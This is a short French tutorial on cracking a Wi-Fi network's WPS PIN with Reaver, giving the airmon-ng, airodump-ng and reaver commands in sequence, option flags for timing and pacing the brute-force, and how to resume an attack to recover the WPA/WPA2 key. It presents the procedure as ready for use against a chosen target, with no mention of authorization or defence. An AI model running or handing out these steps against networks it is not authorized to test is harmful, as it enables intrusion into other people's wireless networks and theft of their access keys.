# Reaver WPS

## Fonctionnement

On va lancer l'outil airmon-ng en mode surveillance (monitor).
On commence par afficher les cartes wifi disponible, saisissez dans un terminal:
```
airmon-ng
```

Pour lancer la surveillance sur votre interface wifi:
```
airmon-ng start wlan0
```

Après on lance airodump pour afficher les réseaux disponibles:
```
airodump-ng mon0
```

Après avoir trouvé le point d'accès à attaquer, on lance reaver-wps avec les arguments suivants:
```
reaver -i mon0 -b [BSSID de l'AP] -vv
```

Quelques options supplémentaires a reaver-wps:
```
-e [ESSID du point d'accès]
-c [Canal du point d'accès]
-t [Delai d'attente de la réception avant de renvoyer] Default 5 secondes
-d [Delai entre chaque tentatives de connexion] Default 1 seondes
-l [Delai d'attente en secondes lors d'une détection WPS]
-f Pour obliger reaver-wps a ne pas changer ne canal
-vv Mode bavard (verbose)
-x [Temps en secondes]
-r [NB Tentative]:[Temps d'arrêt] Permet de faire une pause toutes les X tentatives.
```

Normalement, reaver-wps doit automatiquement se configurer pour s'associer au point d'accès et ainsi commencer l'attaque brute force du PIN.

Une fois le code PIN trouvé, reaver-wps vous affichera la clé de connexion WPA/WPA2 PSK

### Sauvegarde

Les données lors de l'attaque d'un point d'accès wifi sont enregistré dans le répertoire:
/etc/reaver

Ce qui permet de relancer plus tard le scan du PA au point où vous étiez arrêté.
